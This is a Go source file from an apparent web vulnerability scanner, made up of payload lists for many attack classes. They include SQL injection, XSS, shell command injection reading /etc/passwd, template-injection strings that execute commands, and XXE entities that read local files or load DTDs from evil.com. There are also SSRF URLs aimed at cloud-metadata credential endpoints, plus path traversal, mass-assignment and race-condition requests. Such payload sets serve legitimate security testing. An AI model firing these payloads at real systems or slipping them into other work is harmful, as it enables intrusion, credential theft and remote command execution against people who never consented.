package scanner

// Payloads - All injection payloads for the scanner

// SQL Injection Payloads
func GetSQLiPayloads() []string {
	return []string{
		// Error-based
		"'",
		"\"",
		"' OR '1'='1",
		"' OR '1'='1'--",
		"' OR '1'='1'/*",
		"\" OR \"1\"=\"1",
		"' OR 1=1--",
		"' OR 1=1#",
		"1' OR '1'='1",
		"1' OR '1'='1'--",
		"admin'--",
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' UNION SELECT NULL,NULL,NULL--",
		// MySQL specific
		"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
		"' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
		// PostgreSQL specific
		"' AND 1=CAST((SELECT version()) AS INT)--",
		// Time-based
		"' AND SLEEP(5)--",
		"' AND SLEEP(5) AND '1'='1",
		"1; WAITFOR DELAY '0:0:5'--",
		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
		"1 OR SLEEP(5)#",
		// Stacked queries
		"'; SELECT SLEEP(5)--",
		"'; WAITFOR DELAY '0:0:5'--",
		// Boolean blind
		"' AND 1=1--",
		"' AND 1=2--",
		"' AND 'a'='a",
		"' AND 'a'='b",
	}
}

// SQL Error Patterns
func GetSQLErrorPatterns() []string {
	return []string{
		"SQL syntax",
		"mysql_fetch",
		"mysql_num_rows",
		"mysql_affected_rows",
		"PostgreSQL query failed",
		"pg_query(",
		"ORA-01756",
		"ORA-00933",
		"Microsoft SQL Server",
		"ODBC SQL Server Driver",
		"SQLSTATE",
		"sqlite_",
		"SQL error",
		"syntax error",
		"unclosed quotation mark",
		"unterminated string",
		"Warning: mysql_",
		"Warning: pg_",
		"valid MySQL result",
		"MySqlClient.",
		"PostgreSQL query failed",
		"ERROR: parser:",
	}
}

// XSS Payloads
func GetXSSPayloads() []string {
	return []string{
		// Basic
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(1)",
		// Filter bypass
		"<SCRIPT>alert(1)</SCRIPT>",
		"<ScRiPt>alert(1)</ScRiPt>",
		"<scr<script>ipt>alert(1)</scr</script>ipt>",
		"<img src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"<body onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		// Event handlers
		"\" onmouseover=\"alert(1)",
		"' onfocus='alert(1)",
		"\" onerror=\"alert(1)",
		// Template literal
		"${alert(1)}",
		"{{constructor.constructor('return alert(1)')()}}",
		// Encoded
		"%3Cscript%3Ealert(1)%3C/script%3E",
		"%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
		// No parentheses
		"<script>alert`1`</script>",
		"<script>alert(document.domain)</script>",
		"<script>throw/onerror=alert(1)</script>",
		// DOM-based
		"#<img src=x onerror=alert(1)>",
		"javascript:void(alert(1))",
	}
}

// Command Injection Payloads
func GetCmdInjectionPayloads() []string {
	return []string{
		"; id",
		"| id",
		"& id",
		"&& id",
		"|| id",
		"`id`",
		"$(id)",
		"; ls -la",
		"| ls -la",
		"`cat /etc/passwd`",
		"$(cat /etc/passwd)",
		"; cat /etc/passwd",
		"| cat /etc/passwd",
		"& cat /etc/passwd",
		// Windows
		"& dir",
		"| dir",
		"&& type C:\\boot.ini",
		// Newline injection
		"\nid",
		"\r\nid",
		"%0aid",
		// Bypass
		";/bin/id",
		"|/bin/id",
		"& /bin/id",
		"`/bin/id`",
		"$(/bin/id)",
		// Encoding bypass
		"%3bid",
		"%7cid",
	}
}

// SSTI Payloads and Patterns
func GetSSTIPayloads() []string {
	return []string{
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"#{7*7}",
		"*{7*7}",
		"${7*7}",
		"{{config}}",
		"{{self.__class__.__mro__}}",
		"{{''.__class__.__mro__[1].__subclasses__()}}",
		"${T(java.lang.Runtime).getRuntime().exec('id')}",
		"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
		"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
		"{% debug %}",
		"{{\"\".__class__.__mro__[2].__subclasses__()}}",
	}
}

func GetSSTIPatterns() map[string]string {
	return map[string]string{
		"49":           "Jinja2",
		"7777777":      "Jinja2",
		"timedelta":    "Jinja2",
		"Config":       "Flask/Jinja2",
		"freemarker":   "FreeMarker",
		"Execute":      "FreeMarker",
		"Runtime":      "Spring/EL",
		"PopChain":     "Pug",
		"ERB":          "ERB/Ruby",
		"Binding":      "ERB/Ruby",
		"application":  "Django",
	}
}

// LDAP Injection Payloads
func GetLDAPPayloads() []string {
	return []string{
		"*)(|(cn=*",
		"*)(objectClass=*",
		"admin)(&))",
		"*()|%26'",
		"admin*)((|userPassword=*)",
		")(|(cn=*",
		"*()|&'",
		"*)((|cn=*",
		"(cn=*)(|(sn=*))",
	}
}

// XXE Payloads
func GetXXEPayloads() []string {
	return []string{
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo/>`,
	}
}

// SSRF Payloads
func GetSSRFPayloads() []string {
	return []string{
		// Internal IPs
		"http://127.0.0.1",
		"http://localhost",
		"http://localhost:80",
		"http://localhost:443",
		"http://localhost:22",
		"http://localhost:3306",
		"http://localhost:6379",
		"http://localhost:27017",
		"http://127.0.0.1:80",
		"http://127.0.0.1:443",
		"http://127.0.0.1:22",
		"http://127.0.0.1:3306",
		"http://[::1]",
		"http://[::1]:80",
		"http://0.0.0.0",
		"http://0x7f000001",
		"http://0177.0.0.1",
		"http://2130706433",
		// Private network
		"http://10.0.0.1",
		"http://10.0.0.2",
		"http://172.16.0.1",
		"http://192.168.0.1",
		"http://192.168.1.1",
		"http://192.168.1.254",
		// Cloud metadata endpoints
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://169.254.169.254/latest/user-data",
		"http://169.254.169.254/openstack/latest/meta_data.json",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
		"http://100.100.100.200/latest/meta-data/", // Alibaba Cloud
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
		// DNS rebinding / bypass
		"http://localtest.me",
		"http://localtest.me/etc/passwd",
		"http://spoofed.burpcollaborator.net",
		// File protocols
		"file:///etc/passwd",
		"file:///etc/hosts",
		"file:///proc/self/environ",
		// Gopher
		"gopher://127.0.0.1:25/",
		"gopher://127.0.0.1:6379/",
		// Dict
		"dict://127.0.0.1:6379/INFO",
	}
}

// Prototype Pollution Payloads
func GetPrototypePollutionPayloads() []map[string]interface{} {
	return []map[string]interface{}{
		// __proto__ pollution
		{"__proto__": map[string]interface{}{"polluted": "yes"}},
		{"__proto__": map[string]interface{}{"isAdmin": true}},
		{"__proto__": map[string]interface{}{"constructor": map[string]interface{}{"prototype": map[string]interface{}{"polluted": "yes"}}}},
		// constructor.prototype
		{"constructor": map[string]interface{}{"prototype": map[string]interface{}{"polluted": "yes"}}},
		{"constructor": map[string]interface{}{"prototype": map[string]interface{}{"isAdmin": true}}},
		// Nested pollution
		{"a": map[string]interface{}{"__proto__": map[string]interface{}{"polluted": "yes"}}},
		// JSON payload variants
		{"__proto__": map[string]interface{}{"toString": "polluted"}},
		{"__proto__": map[string]interface{}{"valueOf": "polluted"}},
	}
}

// Prototype Pollution URL payloads (for query/body params)
func GetPrototypePollutionURLPayloads() []map[string]string {
	return []map[string]string{
		{"__proto__[polluted]": "yes"},
		{"__proto__[isAdmin]": "true"},
		{"constructor[prototype][polluted]": "yes"},
		{"constructor[prototype][isAdmin]": "true"},
		{"__proto__.polluted": "yes"},
		{"__proto__.isAdmin": "true"},
	}
}

// Race Condition Payloads - request patterns to test
func GetRaceConditionPayloads() []RaceConditionTest {
	return []RaceConditionTest{
		{Endpoint: "/api/v1/coupon/apply", Method: "POST", Body: `{"code":"FREE100"}`, Concurrency: 20, Name: "Coupon Race"},
		{Endpoint: "/api/v1/transfer", Method: "POST", Body: `{"amount":100,"to":"user2"}`, Concurrency: 20, Name: "Transfer Race"},
		{Endpoint: "/api/v1/withdraw", Method: "POST", Body: `{"amount":1000}`, Concurrency: 20, Name: "Withdraw Race"},
		{Endpoint: "/api/v1/vote", Method: "POST", Body: `{"candidate_id":1}`, Concurrency: 20, Name: "Vote Race"},
		{Endpoint: "/api/v1/like", Method: "POST", Body: `{"post_id":1}`, Concurrency: 20, Name: "Like Race"},
		{Endpoint: "/api/v1/checkout", Method: "POST", Body: `{}`, Concurrency: 10, Name: "Checkout Race"},
		{Endpoint: "/api/v1/referral", Method: "POST", Body: `{"code":"REFER50"}`, Concurrency: 10, Name: "Referral Race"},
		{Endpoint: "/api/v1/redeem", Method: "POST", Body: `{"points":100}`, Concurrency: 10, Name: "Redeem Race"},
	}
}

// RaceConditionTest defines a single race condition test
func GetMassAssignmentPayloads() []map[string]interface{} {
	return []map[string]interface{}{
		{"extra": map[string]interface{}{"role": "admin"}},
		{"extra": map[string]interface{}{"isAdmin": true}},
		{"extra": map[string]interface{}{"is_admin": true}},
		{"extra": map[string]interface{}{"role": "administrator"}},
		{"extra": map[string]interface{}{"active": true, "verified": true}},
		{"extra": map[string]interface{}{"plan": "premium"}},
		{"extra": map[string]interface{}{"credit": 99999}},
		{"extra": map[string]interface{}{"permissions": []string{"admin", "superadmin"}}},
		{"extra": map[string]interface{}{"email": "attacker@evil.com"}},
		{"extra": map[string]interface{}{"password": "hacked123"}},
	}
}

// Host Header Injection Payloads
func GetHostHeaderPayloads() []string {
	return []string{
		"evil.com",
		"localhost",
		"127.0.0.1",
		"attacker.com",
		"example.com",
		"original-host.com\r\nX-Injected: true",
	}
}

// HTTP Method Override Headers
func GetHTTPMethodOverridePayloads() []map[string]string {
	return []map[string]string{
		{"X-HTTP-Method-Override": "PUT"},
		{"X-HTTP-Method-Override": "DELETE"},
		{"X-HTTP-Method-Override": "PATCH"},
		{"X-Method-Override": "PUT"},
		{"X-Method-Override": "DELETE"},
		{"X-HTTP-Method": "PUT"},
		{"X-HTTP-Method": "DELETE"},
		{"X-HTTP-Method": "PATCH"},
		{"_method": "PUT"},
	}
}

// GraphQL Introspection Query
func GetGraphQLIntrospectionQuery() string {
	return `{"query":"{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }"}`
}

// Common API sub-paths for deeper discovery
func GetAPIEndpointPatterns() []string {
	return []string{
		// REST API v1
		"/api/v1/users", "/api/v1/users/1", "/api/v1/posts", "/api/v1/posts/1",
		"/api/v1/comments", "/api/v1/categories", "/api/v1/tags",
		"/api/v1/products", "/api/v1/orders", "/api/v1/items",
		"/api/v1/files", "/api/v1/uploads", "/api/v1/images",
		"/api/v1/auth/login", "/api/v1/auth/register", "/api/v1/auth/me",
		"/api/v1/auth/refresh", "/api/v1/auth/logout",
		"/api/v1/admin", "/api/v1/admin/users", "/api/v1/admin/settings",
		"/api/v1/config", "/api/v1/settings", "/api/v1/profile",
		"/api/v1/notifications", "/api/v1/messages",
		"/api/v1/search", "/api/v1/export", "/api/v1/import",
		"/api/v1/analytics", "/api/v1/logs", "/api/v1/audit",
		// REST API v2
		"/api/v2/users", "/api/v2/users/1", "/api/v2/posts",
		"/api/v2/auth/login", "/api/v2/auth/me",
		// REST (no version)
		"/api/users", "/api/users/1", "/api/posts", "/api/posts/1",
		"/api/auth/login", "/api/auth/register", "/api/auth/me",
		"/api/admin", "/api/config", "/api/settings",
		"/api/search", "/api/upload", "/api/files",
		// GraphQL
		"/graphql", "/graphiql", "/api/graphql", "/query",
		// REST (alternate)
		"/rest/users", "/rest/api/v1/users",
		"/v1/users", "/v2/users",
		// Common SPA patterns
		"/api/me", "/api/session", "/api/token",
		"/auth/login", "/auth/register", "/auth/callback",
		"/oauth/token", "/oauth/authorize", "/oauth/callback",
	}
}

// Path Traversal Payloads
func GetPathTraversalPayloads() []string {
	return []string{
		"../../../etc/passwd",
		"../../../../../../../../etc/passwd",
		"..\\..\\..\\boot.ini",
		"..\\..\\..\\..\\..\\..\\..\\boot.ini",
		"....//....//....//etc/passwd",
		"..%2f..%2f..%2fetc/passwd",
		"..%252f..%252f..%252fetc/passwd",
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		"/etc/passwd",
		"/etc/passwd%00",
		"../../../etc/passwd%00.jpg",
		"....\\....\\....\\boot.ini",
		"..%5c..%5c..%5cboot.ini",
		"..%255c..%255c..%255cboot.ini",
	}
}
